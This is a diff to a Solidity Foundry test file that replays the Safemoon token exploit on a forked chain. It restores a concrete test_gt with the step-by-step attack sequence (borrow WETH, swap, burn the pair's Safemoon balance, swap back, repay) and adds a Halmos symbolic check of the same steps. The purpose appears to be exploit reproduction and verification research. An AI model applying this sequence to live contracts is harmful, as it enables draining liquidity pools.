@@ -304,7 +304,6 @@ contract SafemoonTestBase is Test, BlockLoader {
             deadline: block.timestamp
         });
         weth.transfer(address(tradeRouter), feeAmount);
-        emit log_string("307");
         tradeRouter.swapExactTokensForTokensWithFeeAmount(trade);
     }
 
@@ -333,59 +332,34 @@ contract SafemoonTestBase is Test, BlockLoader {
         IUniswapV2Pair(safemoon.getPairAddr()).sync();
     }
 
-    // function test_gt() public {
-    //     vm.startPrank(attacker);
-    //     vm.warp(blockTimestamp);
-    //     vm.roll(26854757);
-    //     emit log_named_uint("amt0", 1000 ether);
-    //     borrow_weth_owner(1000 ether);
-    //     printBalance("After step0 ");
-    //     emit log_named_uint("amt1", 800 * 1e18);
-    //     emit log_named_uint("amt2", 0);
-    //     swap_pair_attacker_weth_safemoon(800 * 1e18, 0);
-    //     printBalance("After step1 ");
-    //     emit log_named_uint(
-    //         "amt3",
-    //         safemoon.balanceOf(address(pair)) - 1000000000
-    //     );
-    //     burn_safemoon_pair(safemoon.balanceOf(address(pair)) - 1000000000);
-    //     printBalance("After step2 ");
-    //     emit log_named_uint("amt4", safemoon.balanceOf(address(attacker)));
-    //     emit log_named_uint("amt5", 0);
-    //     swap_pair_attacker_safemoon_weth(
-    //         safemoon.balanceOf(address(attacker)),
-    //         0
-    //     );
-    //     printBalance("After step3 ");
-    //     emit log_named_uint("amt6", 1000 ether);
-    //     payback_weth_owner(1000 ether);
-    //     printBalance("After step4 ");
-    //     require(attackGoal(), "Attack failed!");
-    //     vm.stopPrank();
-    // }
-
     function test_gt() public {
-uint256 amt0 = 0xde0b6b3a7640000;
-uint256 amt1 = 0xde0b6b3a7640000;
-uint256 amt2 = 0x3e73362871420;
-uint256 amt3 = 0x1ae32388de294f000;
-uint256 amt4 = 0x3782dace9d900;
-uint256 amt5 = 0x1bc16d674ec80000;
-uint256 amt6 = 0x14d1120d7b160000;
-
- vm.startPrank(attacker);
-        // vm.warp(blockTimestamp);
-        // vm.roll(26854757);
-        vm.assume(amt6 >= amt0);
+        vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(26854757);
+        emit log_named_uint("amt0", 1000 ether);
+        borrow_weth_owner(1000 ether);
         printBalance("After step0 ");
-        borrow_weth_owner(amt0);
+        emit log_named_uint("amt1", 800 * 1e18);
+        emit log_named_uint("amt2", 0);
+        swap_pair_attacker_weth_safemoon(800 * 1e18, 0);
         printBalance("After step1 ");
-        swap_pair_attacker_weth_safemoon(amt1, amt2);
+        emit log_named_uint(
+            "amt3",
+            safemoon.balanceOf(address(pair)) - 1000000000
+        );
+        burn_safemoon_pair(safemoon.balanceOf(address(pair)) - 1000000000);
         printBalance("After step2 ");
-        burn_safemoon_pair(amt3);
-        swap_pair_attacker_safemoon_weth(amt4, amt5);
-        payback_weth_owner(amt6);
-        require(!attackGoal(), "Attack succeed!");
+        emit log_named_uint("amt4", safemoon.balanceOf(address(attacker)));
+        emit log_named_uint("amt5", 0);
+        swap_pair_attacker_safemoon_weth(
+            safemoon.balanceOf(address(attacker)),
+            0
+        );
+        printBalance("After step3 ");
+        emit log_named_uint("amt6", 1000 ether);
+        payback_weth_owner(1000 ether);
+        printBalance("After step4 ");
+        require(attackGoal(), "Attack failed!");
         vm.stopPrank();
     }
 
@@ -407,7 +381,29 @@ uint256 amt6 = 0x14d1120d7b160000;
         burn_safemoon_pair(amt3);
         swap_pair_attacker_safemoon_weth(amt4, amt5);
         payback_weth_owner(amt6);
-        require(!attackGoal(), "Attack succeed!");
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_gt_halmos(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6
+    ) public {
+        vm.startPrank(attacker);
+        vm.warp(blockTimestamp);
+        vm.roll(26854757);
+        vm.assume(amt6 >= amt0);
+        borrow_weth_owner(amt0);
+        swap_pair_attacker_weth_safemoon(amt1, amt2);
+        burn_safemoon_pair(amt3);
+        swap_pair_attacker_safemoon_weth(amt4, amt5);
+        payback_weth_owner(amt6);
+        assert(!attackGoal());
         vm.stopPrank();
     }
 }
